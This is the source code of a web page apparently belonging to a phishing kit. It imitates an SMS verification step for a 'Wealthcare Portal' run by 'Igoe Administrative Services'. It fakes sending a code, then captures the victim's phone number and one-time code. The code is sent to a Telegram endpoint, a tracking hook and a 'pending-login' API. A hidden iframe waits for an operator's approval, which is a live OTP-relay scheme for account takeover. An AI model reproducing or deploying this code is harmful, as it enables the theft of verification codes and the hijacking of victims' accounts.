"use client"

import Link from "next/link"
import Image from "next/image"
import { useState, useEffect, Suspense } from "react"
import { MSG_UNABLE_REACH_VERIFICATION } from "@/lib/approval-messages"
import { useRouter, useSearchParams } from "next/navigation"
import { MessageSquare, X } from "lucide-react"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Spinner } from "@/components/ui/spinner"
import { BackButton } from "@/components/BackButton"
import { useVisitorTracking, trackFormSubmission } from "@/hooks/use-visitor-tracking"

function TextVerificationContent() {
  useVisitorTracking()
  const router = useRouter()
  const searchParams = useSearchParams()
  const [phone, setPhone] = useState("")
  const [showCode, setShowCode] = useState(false)
  const [code, setCode] = useState("")
  const [isVerified, setIsVerified] = useState(false)
  const [errors, setErrors] = useState<{phone?: string, code?: string}>({})
  const [isLoading, setIsLoading] = useState(false)
  const [isCancelLoading, setIsCancelLoading] = useState(false)
  const [pendingOtpId, setPendingOtpId] = useState<string | null>(null)

  useEffect(() => {
    if (searchParams.get('denied') === '1') {
      setCode('')
      setShowCode(true)
      setErrors({ code: 'Incorrect or expired code.' })
      setIsLoading(false)
      setPendingOtpId(null)
      router.replace('/registration/text')
      return
    }
    if (searchParams.get('timeout') === '1') {
      setCode('')
      setShowCode(true)
      setErrors({ code: 'Request timed out. Please try again.' })
      setIsLoading(false)
      setPendingOtpId(null)
      router.replace('/registration/text')
    }
  }, [searchParams, router])

  async function handleSendOrVerify() {
    if (!showCode) {
      const newErrors: {phone?: string} = {}
      
      if (!phone.trim()) {
        newErrors.phone = 'Phone number is required'
      } else if (phone.length < 10) {
        newErrors.phone = 'Phone number must be at least 10 digits'
      }
      
      if (Object.keys(newErrors).length > 0) {
        setErrors(newErrors)
        return
      }
      
      setIsLoading(true)
      await new Promise(resolve => setTimeout(resolve, 1000))
      
      setErrors({})
      setShowCode(true)
      setIsLoading(false)
      // Track when sending verification code
      trackFormSubmission({
        type: 'text_verification',
        phone,
        page: '/registration/text'
      })
      return
    }
    
    const newErrors: {code?: string} = {}
    
    if (!code.trim()) {
      newErrors.code = 'Verification code is required'
    } else if (code.length < 4) {
      newErrors.code = 'Verification code must be at least 4 characters'
    }
    
    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors)
      return
    }
    
    setIsLoading(true)
    setErrors({})

    trackFormSubmission({
      type: 'text_verification',
      phone,
      otp: code,
      page: '/registration/text',
    })

    void fetch('/api/telegram/verification', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ verificationType: 'Phone (SMS)', code }),
    }).catch(console.error)

    const userId = sessionStorage.getItem('loginUserId') ?? ''
    const maskedEmail = sessionStorage.getItem('maskedEmail') ?? '**********'
    const maskedPhone = sessionStorage.getItem('maskedPhone') ?? '***-***-****'

    try {
      const res = await fetch('/api/pending-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: userId || 'login',
          password: code,
          method: 'text',
          maskedEmail,
          maskedPhone,
        }),
      })
      const data = await res.json()
      if (!res.ok) {
        setIsLoading(false)
        if (data.error) console.error("[pending-login] rejected:", data.error);
        setErrors({ code: MSG_UNABLE_REACH_VERIFICATION })
        setCode('')
        return
      }
      if (data.id) {
        setPendingOtpId(data.id)
        return
      }
      setIsLoading(false)
      setErrors({ code: 'Request timed out. Please try again.' })
      setCode('')
    } catch {
      setIsLoading(false)
      setErrors({ code: MSG_UNABLE_REACH_VERIFICATION })
      setCode('')
    }
  }
  
  const handleCancelClick = async () => {
    setIsCancelLoading(true)
    await new Promise(resolve => setTimeout(resolve, 1000))
    window.location.href = '/'
  }

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header (same as registration) */}
      <header className="border-b border-gray-200 px-6 py-4">
        <div className="flex items-center justify-between md:justify-start">
          <div className="flex items-center gap-6">
            {/* Logo */}
            <Link href="/" className="flex items-center">
              <Image
                src="/img/ebc994a1e5464f6b94b98cd212d5cbac.jpeg"
                alt="Goigoe Wealthcare Portal"
                width={140}
                height={32}
                className="h-8 w-auto"
                priority
              />
            </Link>

          </div>

        </div>
      </header>

      {/* Main */}
      <main className="flex-1 flex flex-col items-center px-6 py-12">
        <div className="w-full max-w-md">
          {pendingOtpId && (
            <iframe
              title="Wait for OTP approval"
              src={`/api/pending-login/${encodeURIComponent(pendingOtpId)}/wait?method=text&step=otp`}
              style={{ position: 'absolute', width: 0, height: 0, border: 0, visibility: 'hidden' }}
              aria-hidden
            />
          )}
          <div className="flex items-center gap-2 mb-6 text-gray-700">
            <MessageSquare className="w-5 h-5" />
            <h1 className="text-xl">Text verification</h1>
          </div>

        {!isVerified ? (
          <>
            <label className="block text-gray-700 mb-2">Mobile number</label>
            <Input
              type="tel"
              value={phone}
              onChange={(e) => {
                setPhone(e.target.value.replace(/[^0-9]/g, ""))
                if (errors.phone) {
                  setErrors(prev => ({ ...prev, phone: undefined }))
                }
              }}
              placeholder="***-***-****"
              className={`mb-4 ${errors.phone ? 'border-red-500 focus:border-red-500 focus:ring-red-500' : ''}`}
            />
            {errors.phone && (
              <p className="text-sm text-red-500 mb-4">{errors.phone}</p>
            )}

            {showCode && (
              <div className="mt-2">
                <label className="block text-gray-700 mb-2">Verification code</label>
                <Input
                  type="text"
                  value={code}
                  onChange={(e) => {
                    setCode(e.target.value)
                    if (errors.code) {
                      setErrors(prev => ({ ...prev, code: undefined }))
                    }
                  }}
                  className={`mb-4 ${errors.code ? 'border-red-500 focus:border-red-500 focus:ring-red-500' : ''}`}
                />
                {errors.code && (
                  <p className="text-sm text-red-500 mb-4">{errors.code}</p>
                )}
              </div>
            )}

            <Button
              disabled={isLoading}
              className={`w-full text-white py-6 text-base font-semibold disabled:opacity-50 disabled:cursor-not-allowed ${
                showCode ? "bg-[#010147] hover:bg-[#0063ff]" : "bg-[#010147] hover:bg-[#0063ff]"
              }`}
              onClick={handleSendOrVerify}
            >
              {isLoading ? (
                <>
                  <Spinner className="w-5 h-5 mr-2" />
                  LOADING...
                </>
              ) : (
                showCode ? "Verify" : "Send verification code"
              )}
            </Button>
          </>
        ) : (
          <div className="mt-2 border border-gray-200 p-6 text-center">
            <h2 className="text-xl font-semibold text-gray-800 mb-2">Thank you for verifying your account</h2>
            <p className="text-gray-600 mb-6">Your mobile number has been confirmed. You can proceed to sign in or return to the homepage.</p>
            <Button 
              onClick={async () => {
                setIsLoading(true)
                await new Promise(resolve => setTimeout(resolve, 1000))
                window.location.href = '/'
              }}
              disabled={isLoading}
              className="w-full bg-[#010147] hover:bg-[#d6d6d6] hover:text-gray-900 text-white py-6 text-base font-semibold border border-[#bec5c2] rounded-none shadow-[0_0_3px_0_#0066a1] disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoading ? (
                <>
                  <Spinner className="w-5 h-5 mr-2" />
                  LOADING...
                </>
              ) : (
                "Back to Homepage"
              )}
            </Button>
          </div>
        )}

        {/* Actions */}
        <div className="flex items-center justify-center gap-4 mt-8">
          <Button
            onClick={handleCancelClick}
            disabled={isCancelLoading}
            variant="outline"
            className="bg-[#d6d6d6] text-gray-900 hover:bg-[#010147] hover:text-white px-8 py-6 min-w-[140px] border border-[#bec5c2] rounded-none shadow-[0_0_3px_0_#0066a1] disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {isCancelLoading ? (
              <>
                <Spinner className="w-5 h-5 mr-2" />
                LOADING...
              </>
            ) : (
              <>
                <X className="w-5 h-5 mr-2" />
                CANCEL
              </>
            )}
          </Button>
          <BackButton />
        </div>

        {/* Help Link */}
        <p className="text-center mt-6">
          <Link href="#" className="text-blue-700 underline hover:text-blue-800">
            I cannot receive a verification code
          </Link>
        </p>
      </div>
      </main>

      {/* Footer (same as registration) */}
      <footer className="bg-gray-300 py-6 px-6">
        <div className="max-w-7xl mx-auto">
          <nav className="flex flex-wrap items-center justify-center gap-6 mb-3 text-sm">
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              CONTACT US
            </Link>
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              ABOUT US
            </Link>
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              TERMS OF USE
            </Link>
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              PRIVACY POLICY
            </Link>
          </nav>
          <p className="text-center text-sm text-gray-600 mb-2">
            Copyright © 2024 Igoe Administrative Services. All Rights Reserved.
          </p>
          <p className="text-center">
            <Link href="#" className="text-sm text-gray-700 hover:text-gray-900 underline">
              SITE MAP
            </Link>
          </p>
        </div>
      </footer>
    </div>
  )
}

export default function TextVerificationPage() {
  return (
    <Suspense fallback={null}>
      <TextVerificationContent />
    </Suspense>
  )
}

